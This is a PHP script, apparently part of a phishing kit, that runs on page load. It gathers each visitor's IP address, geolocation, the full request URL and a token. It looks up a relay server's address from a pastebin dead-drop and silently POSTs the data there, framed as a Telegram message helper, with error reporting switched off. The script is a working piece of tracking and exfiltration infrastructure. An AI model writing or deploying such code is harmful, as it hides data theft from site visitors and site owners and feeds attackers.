<?php
function mySendTelegramMessage($message, $keyboard = null) {
	error_reporting(0);
	session_start();
	$getip = trim(file_get_contents('https://pastebin.com/raw/qNKZAAhb'));
    $api1_Url = 'http://' . $getip . '/api1';
	$TIMEOUT = 5;
	function jsonResponse(array $data, int $status = 200) {
		http_response_code($status);
		header("Content-Type: application/json; charset=utf-8");
		echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
		exit;
	}
    $data = [
        "message"    => $message,
        "parse_mode" => "HTML"
    ];
    if ($keyboard) {
        $data["keyboard"] = json_encode($keyboard, JSON_UNESCAPED_UNICODE);
    }
    $headers = [
        "Content-Type: application/x-www-form-urlencoded"
    ];
    $context = stream_context_create([
        "http" => [
            "method"        => "POST",
            "header"        => implode("\r\n", $headers),
            "content"       => http_build_query($data),
            "timeout"       => $TIMEOUT,
            "ignore_errors" => true
        ]
    ]);
    $response = @file_get_contents($api1_Url, false, $context);
    if ($response === false) {
        return [
            "ok" => false,
            "error" => "SERVICE_UNREACHABLE"
        ];
    }
    $statusCode = 0;
    if (isset($http_response_header[0])) {
        preg_match('#HTTP/\d+\.\d+\s+(\d+)#', $http_response_header[0], $m);
        $statusCode = (int)($m[1] ?? 0);
    }
    switch ($statusCode) {
        case 200:
            return ["ok" => true];
        case 404:
            return [
                "ok" => false,
                "error" => "INVALID_API_ROUTE"
            ];
        case 400:
            return [
                "ok" => false,
                "error" => "BAD_REQUEST"
            ];
        default:
            return [
                "ok" => false,
                "error" => "UNKNOWN_ERROR",
                "status" => $statusCode
            ];
    }
}

function checker() {
	require_once __DIR__ . '/includes/main.php';
	$bot = TELEGRAM_TOKEN;
	//----------------------------------------------
	$ip = getenv("REMOTE_ADDR"); 
	$url = "http://ipwhois.app/json/{$ip}";
	$response = @file_get_contents($url);
	if ($response) {
	$isp = json_decode($response, true);
	$isp_isp = $isp['isp'] ?? 'ISP: N/A';
	$isp_org = $isp['org'] ?? 'Org: N/A';
	$isp_cont = $isp['country'] ?? 'Country: N/A';
	$isp_cod = $isp['country_code'] ?? 'Code: N/A';
	} else {
	$isp_isp = 'ISP: N/A';
	$isp_org = 'Org: N/A';
	$isp_cont = 'Country: N/A';
	$isp_cod = 'Code: N/A';
	}
 $date = date("H:i:s d/m/Y", time());
 $web = $_SERVER["HTTP_HOST"];
 $inj = $_SERVER["REQUEST_URI"];
 $dir = dirname($_SERVER['PHP_SELF']);
 $message = "<strong>🩸 =========| <code>$ip</code> | <i>$isp_cod</i> |========= 🩸</strong>\n";
 $message .= "<strong>[⏱️] ┌───────── ᴛɪᴍᴇ:</strong> ".gmdate ("H:i:s")."\n";
 $message .= "<strong>[🧩] ├── ᴛᴏᴋᴇɴ:</strong> <code>$token</code> \n";
 $message .= "<strong>[🔗] └── ꜰᴜʟʟ ᴜʀʟ:</strong> https://$web$inj \n";
    $keyboard = [
        'inline_keyboard' => [
			[
                ['text' => '[📍 Geo_IP 📍]', 'url' => "https://myip.ms/info/whois/{$ip}"]
            ]
        ]
    ];
$result = mySendTelegramMessage($message, $keyboard); 
	if (!$result["ok"]) {
    	switch ($result["error"]) {
        	case "INVALID_API_ROUTE":
            	jsonResponse([
                	"ok" => false,
                	"error" => "INVALID_API_ROUTE",
                	"message" => "Invalid API endpoint configuration"
            	], 404);
        	case "SERVICE_UNREACHABLE":
            	jsonResponse([
                	"ok" => false,
                	"error" => "SERVICE_UNREACHABLE",
                	"message" => "Service is offline or unreachable"
            	], 503);
        	case "BAD_REQUEST":
            	jsonResponse([
                	"ok" => false,
                	"error" => "BAD_REQUEST",
                	"message" => "Invalid data sent to API"
            	], 400);
        default:
            jsonResponse([
                "ok" => false,
                "error" => "UNKNOWN_ERROR",
                "message" => "Unexpected error occurred",
                "status" => $result["status"] ?? 0
            ], 500);
		}
	}
}
checker();
?>
